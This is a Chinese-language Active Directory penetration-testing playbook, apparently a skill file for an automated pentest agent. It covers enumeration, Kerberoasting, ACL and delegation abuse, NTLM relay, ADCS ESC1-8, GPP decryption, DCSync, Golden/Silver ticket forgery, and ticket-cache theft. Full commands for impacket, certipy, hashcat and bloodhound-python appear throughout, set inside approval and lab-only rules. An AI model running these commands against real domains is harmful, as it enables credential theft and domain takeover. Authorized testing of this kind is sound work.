---
id: ad-attack
title: AD 域渗透手册（枚举/Kerberoast/ACL/Relay/委派/ADCS/GPP/LAPS/域信任）
tags: ad,域,kerberos,kerberoast,dcsync,adcs,relay,委派,s6
---
# AD 域渗透手册（**利用级动作全部 L2 审批**，进入条件=已获域内立足点）

## 一、域内枚举（L0/L1 只读优先）

```bash
# 域信息（任意域内凭据/匿名读）：
ldapsearch -x -H ldap://DC -b "dc=x,dc=local" "(objectClass=domain)" -LLL
# 用户/组/SPN（凭据可用时，ldapsearch 过滤）：
#   用户: (objectClass=user)  组: (objectClass=group)  SPN: (servicePrincipalName=*)
# 拓扑采集（bloodhound-python 类，只读；数据落 evidence/ 不外传）：
bloodhound-python -u <u> -p <p> -ns <dc-ip> -d <domain> -c All
# 用户名枚举（预认证面，仅限测试账号清单）：kerbrute userenum --dc <dc> users.txt
# 域控发现: nmap -sV -p 88,389,636,3268 --open <cidr> + SRV 记录（dig _ldap._tcp.dc._msdcs.<domain>）
```

## 二、Kerberoast / AS-REP（判据=票据可获取；离线爆破受 ROE 额度约束）

```bash
# Kerberoast：请求 SPN TGS（只读请求，票据本身非利用）
GetUserSPNs.py 域/账号:密码 -dc-ip DC -request -outputfile evidence/tgs.txt
# 离线爆破: hashcat -m 13100 evidence/tgs.txt <字典>（额度：字典限前段+时间窗，ROE 内）
# AS-REP Roast（预认证未启用）: GetNPUsers.py 域/ -usersfile users.txt -dc-ip DC
```

## 三、ACL 滥用速查（枚举判据 → 利用命令，全部转 S5 审批）

bloodhound/ldap 枚举发现以下 ACE 时，对应利用面（BloodHound「Shortest Path」反查可落地路径）：

| ACE | 判据 | 利用方向（S5 执行） |
|---|---|---|
| GenericAll / AllExtendedRights | 对目标用户/组完全控制 | 改密（ForceChangePassword）/加组/高价值目标接管 |
| GenericWrite | 可写目标属性 | 写 SPN → Kerberoast 目标 / 写 msDS-KeyCredentialLink → 影子凭据（Shadow Credentials，S5） |
| WriteDACL | 可改目标 ACL | 给自己写 DCSync 权限（S5） |
| ForceChangePassword | 可强制改密 | 直接改测试账号密码登录 |
| AddMember | 可加组成员 | 把测试账号加入高权限组 |

## 四、GPP / LAPS / 本地口令面

- **GPP cpassword**：`find <SYSVOL挂载> -name Groups.xml`（或 SMB 拉 `\\<domain>\SYSVOL\` 策略目录）→ `gpp-decrypt <cpassword>`（历史部署遗留；命中即本地管理员口令）。
- **LAPS**：ldap 查 `ms-Mcs-AdmPwd` 属性可读性（普通用户可读=配置缺陷，判据→记录）。
- 域内目录/共享搜配置凭据（windows-lateral 第三节文件系统搜法同源）。

## 五、NTLM Relay 链（存在性验证优先）

1. **抓取面**：Responder（LLMNR/NBT-NS/mDNS 投毒）+ mitm6（IPv6/DNS）——判定"网络内存在可诱导认证"这一事实。
2. **中继目标**：SMB 签名未强制的主机（`nxc smb <cidr> --gen-relay-list`，windows-lateral 枚举产物）+ ADCS HTTP 端点（ESC8 面）。
3. **验证口径**：relay 到测试机拿 shell / relay 到 ADCS 申请证书（S5）；**不做 relay 回真实核心服务器**——存在性证明（收到认证+目标可中继判据）即登记黑板。

## 六、委派滥用（枚举判据 → 利用转 S5）

- 非约束委派：`userAccountControl & 0x80000`（TRUSTED_FOR_DELEGATION）——DC 之外有此标记=高危（等管理员连入即收凭据，判据登记）。
- 约束委派：`msDS-AllowedToDelegateTo` 非空 → S4U2Self/S4U2Proxy 模拟面（S5）。
- **RBCD**：`msDS-AllowedToActOnBehalfOfOtherIdentity` 可写（GenericWrite 链）→ 四步利用（加机器账号→写属性→S4U 票据→模拟，S5 全程审批）。

## 七、ADCS ESC1-8 速查（certipy 只读枚举 → 判别）

```bash
certipy find -u <u>@<domain> -p <p> -dc-ip DC -vulnerable   # 只读枚举+漏洞模板标注
certipy ca -u <u>@<domain> -p <p> -dc-ip DC                  # CA 信息
```

| ESC | 判据要点 |
|---|---|
| ESC1 | 模板 ENROLLEESUPPLIESSUBJECT + 认证 EKU + 普通用户可 enroll → 申请任意身份证书（S5） |
| ESC2/3/4 | AnyPurpose/子 CA EKU / enrollee 自身可管模板 |
| ESC5 | 注册表/Web 端点写权限 |
| ESC6 | CA 配置 EDITF_ATTRIBUTESUBJECTALTNAME2 |
| ESC7 | CA 上 ManageCA/ManageCertificates 权限 |
| ESC8 | CA Web 端点 NTLM 可中继（衔接第五节） |

命中判据 → upsert_fact(confirmed) → 证书申请/身份伪造属利用，转 S5。

## 八、DCSync / 域信任 / 跨域

- **DCSync**（DRSUAPI 复制）：仅当 ROE 明确允许凭据导出时，目标限测试账号；`GetUserSPNs` 同款判据先行（ACL 有 DCSync 权限的非常规账户=高危发现）。
- **域信任**：`ldapsearch (objectClass=trustedDomain)` → 信任方向/类型（parent-child / forest / external）；跨林攻击面（SID History/信任密钥）枚举判据先行，利用 S5。
- **ZeroLogon/noPac/SamAccountName 欺骗**：判据=补丁状态探测（只读探测面），利用级动作一律 S5 + 人工确认（有域控崩溃风险的 PoC 默认不执行——FORBIDDEN 口径）。

## 九、纪律

- 域内一切动作前核对：域控与关键资产**在授权范围内**（ROE 红线 1）。
- 票据/凭据只登记摘要（record_loot 掩码，不落明文）；bloodhound 数据含敏感拓扑——只存 evidence/ 不外传。
- 影响评估按「最小路径」原则：证明「能到域控」即可，不做真实域控操作；每条路径 upsert_fact 链接（links 字段连成攻击图）。

## v4.8 M6 工具通道兼容性声明

> 通用判据以 `tool-channels.md` 为准（v5.1 单源去重）；本技能差异：certipy/Impacket/netexec 等内网工具链在内网直连下可用（无应用层挑战）——经隧道运行时注意双层限速；Kerberoast/ASREPRoast 类请求受 ROE cred_attack 额度约束。nmap/curl 通用行不再内联。

## v5.6.0 AD 票据伪造链补全（三凭证审计 S2 轨；MITRE T1558 对照）

> 前置纪律：本节全部动作属 **Lab Only**（isolated_lab 可快照回滚的隔离域）——生产档只做只读枚举与影响说明（Golden/Silver 票据伪造对生产域控有真实副作用）。工具探针先行：`which impacket-secretsdump impacket-getST mimikatz 2>/dev/null`（impacket 已随 Kali 底座；mimikatz 类 Windows 原生工具标注"需实验域环境"）。

### 新增伪造矩阵

1. **Golden Ticket（T1558.001）**： krbtgt NTLM 哈希在手（secretsdump 已覆盖）→ `impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain <域> -user-id 500 administrator` 伪造 TGT；判据：psexec/smbexec 用伪造票访问域控 ADMIN$ 成功（隔离域）。清理：销毁本地 ccache，域侧不产生工件（票据由 DC 日志可见 → 报告标注）。
2. **Silver Ticket（T1558.002）**： 服务账号 NTLM + SPN → `impacket-ticketer -spn <SPN> ...` 伪造 TGS；判据：目标服务接受伪造票（CIFS/HTTP/Host 类 SPN 分别验证）。
3. **Pass-the-Ticket（T1550.003）**： 收集的 ccache/票据注入新会话（`export KRB5CCNAME=...` + impacket 工具族）——跨主机票据复用面；判据：注入后访问新资源成功。
3b. **票据缓存收集（T1558.005，v5.6.1 补齐）**：①标准路径发现：Linux `/tmp/krb5cc_*`、`/var/lib/sss/db/ccache_*`；Windows 域内 mimikatz/Rubeus triage（Lab Only）②自定义 `KRB5CCNAME` 枚举（`env | grep KRB5CC`）③权限判据：当前用户可读他人 ccache = 票据窃取候选（影响=该用户全部 Kerberos 服务票据）④提取：cp 工作区（0600）→ kirbi 转换 → PtT 注入验证。证据：路径+权限位+principal 列表（`klist -C`），票据值不落库（掩码纪律）。
4. **ccache 变体与跨格**： kirbi(ccache) ↔ KRB-CRED 转换（impacket ticketer 自带）；文件名/注入路径标准化（/tmp/ticket.ccache 权限 600，收口删除）。
5. **RBCD/S4U2self+u2x** 已有节——本节与其衔接：RBCD 成功取得的 ST 同样走 Pass-the-Ticket 注入测试。

### 证据与谱系

- 伪造票据 store_credential **origin=forged method=golden-ticket/silver-ticket/pass-the-ticket** 入库（kind=token，target=域控/服务 SPN）；
- 每张伪造票的 S4U/DER 编码原文不入库（太大）——存 evidence/<stage>/ticket-<n>.ccache（0600）+ 掩码登记；
- 报告口径：票据伪造 = 影响证明（域接管级），全部在隔离域演示；production_safe 项目只报告"具备伪造前提"（krbtgt 哈希在手）+ 人工移交。

### 与既有节衔接

Kerberoast/AS-REP（上文）取得服务账号哈希 → 离线破解（password-offline）→ Silver Ticket 伪造 → Pass-the-Ticket 横向——五步构成完整"凭证从获取到伪造到横向"链，覆盖矩阵按此记账。

## v5.6.0 枚举证据格式与低权→影响验证矩阵（三凭证审计补强）

### 工具能力探针（开工先行，缺失如实降级）

`which impacket-secretsdump impacket-getUsersNP impacket-getTGT bloodhound-python certipy ldeep`——impacket 族随 Kali 底座；BloodHound 数据采集（bloodhound-python 用合法凭据运行，生产档只读）缺失 → SharpHound 需 Windows 域内环境（标注"需域内执行环境"），不硬凑。

### 枚举证据格式（每项产出结构化记录）

```
枚举单：<对象类型（用户/组/ACL/GPO/证书模板）>
工具与命令：精确命令行（可复现）
产出：结果文件路径 + 关键行摘录
影响线索：写权限/委派/证书模板危险位（如 EnrolleeSuppliesSubject、ESC1-8 判据位）
```

### 低权 → 影响验证矩阵（逐级收口）

| 起点能力 | 验证动作（Lab/审批内） | 影响级 |
|---|---|---|
| 任意域用户凭据 | 血励枚举 → 攻击路径图（短路径优先） | 基础 |
| Kerberoast 可破 SPN | 破解 → 服务账号权限面（Silver Ticket 前置） | 中 |
| WriteDacl/AllExtendedRight | 对 DC/ADCS 对象的写权限验证（Lab） | 高 |
| 证书模板 ESC1 位 | certipy 申请 UA（Lab） | 接管 |
| krbtgt 哈希 | Golden Ticket（v5.6.0 节，Lab Only） | 全域接管 |

- 每行命中即 record_finding（路径上每步 evidence 留证）；全程隔离域演示口径（生产档只枚举+报告路径，不执行写/伪造——对齐 v5.6.0 票据节纪律）。
